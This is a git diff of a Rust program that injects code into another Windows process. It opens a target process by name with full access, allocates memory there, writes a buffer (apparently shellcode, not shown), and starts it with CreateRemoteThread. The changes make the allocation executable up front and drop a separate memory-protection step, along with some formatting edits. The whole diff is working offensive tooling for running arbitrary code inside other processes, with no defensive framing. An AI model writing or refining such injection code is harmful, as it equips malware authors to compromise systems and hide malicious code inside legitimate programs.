@@ -8,8 +8,7 @@ use windows::Win32::{
     System::{
         Diagnostics::Debug::WriteProcessMemory,
         Memory::{
-            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-            PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE
         },
         Threading::{
             CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
@@ -26,9 +25,7 @@ fn find_process(name: &str) -> Result<HANDLE, String> {
             let pid = pid.as_u32();
             let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
             if hprocess.is_err() {
-                return Err(String::from(format!(
-                    "Failed to open process with PID: {pid}"
-                )));
+                return Err(String::from(format!("Failed to open process with PID: {pid}")));
             } else {
                 return Ok(hprocess.unwrap());
             }
@@ -67,13 +64,13 @@ fn main() {
     });
 
     unsafe {
-        println!("[i] Allocating Memory in the Process");
+        println!("[+] Allocating Memory in the Process");
         let address = VirtualAllocEx(
             h_process,
             None,
             buf.len(),
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+            PAGE_EXECUTE_READ,
         );
 
         if address.is_null() {
@@ -81,22 +78,10 @@ fn main() {
             panic!("[!] Failed to Allocate Memory in Target Process.");
         }
 
-        println!("[i] Writing to memory");
+        println!("[+] Writing to memory");
         WriteProcessMemory(h_process, address, buf.as_ptr() as _, buf.len(), None).unwrap_or_else(|e| {
             CloseHandle(h_process);
-            panic!("[!] WriteProcessMemory Failed With Error: {}", e);
-        });
-
-        let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtectEx(
-            h_process,
-            address,
-            buf.len(),
-            PAGE_EXECUTE_READWRITE,
-            &mut oldprotect,
-        ).unwrap_or_else(|e| {
-            CloseHandle(h_process);
-            panic!("[!] VirtualProtectEx Failed With Error: {}", e);
+            panic!("[!] WriteProcessMemory Failed With Error: {e}");
         });
 
         println!("[+] Creating a Remote Thread");
@@ -110,7 +95,7 @@ fn main() {
             None,
         ).unwrap_or_else(|e| {
             CloseHandle(h_process);
-            panic!("[!] CreateRemoteThread Failed With Error: {}", e);
+            panic!("[!] CreateRemoteThread Failed With Error: {e}",);
         });
 
         println!("[+] Executed!!");
